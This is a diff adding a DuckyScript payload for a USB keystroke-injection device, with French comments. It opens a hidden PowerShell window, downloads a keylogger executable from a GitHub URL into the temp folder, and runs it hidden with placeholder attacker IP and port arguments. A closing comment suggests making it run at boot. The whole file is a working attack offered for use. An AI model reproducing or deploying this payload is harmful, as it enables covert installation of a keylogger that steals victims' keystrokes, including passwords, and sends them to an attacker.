@@ -1,0 +1,24 @@
+REM Configuration
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell -WindowStyle hidden
+ENTER
+DELAY 500
+
+REM Télécharger l'exécutable depuis l'URL spécifiée
+STRING (New-Object System.Net.WebClient).DownloadFile("https://github.com/tempasama/rubber-ducky/raw/main/rubber-ducky/KeyLogger/keylogger.exe", "$env:TEMP\keylogger.exe")
+ENTER
+DELAY 500
+
+REM Exécuter l'exécutable téléchargé
+STRING cd "$env:TEMP"
+ENTER
+DELAY 500
+STRING Start-Process -FilePath ".\keylogger.exe" -ArgumentList "YOUR IP ATTACK", "PORT ATTACK" -WindowStyle Hidden
+DELAY 100
+STRING exit
+REM Entrer automatiquement les valeurs
+DELAY 100
+ENTER
+REM Vous pouvez ajouter un fichier qui s'éxécute au boot
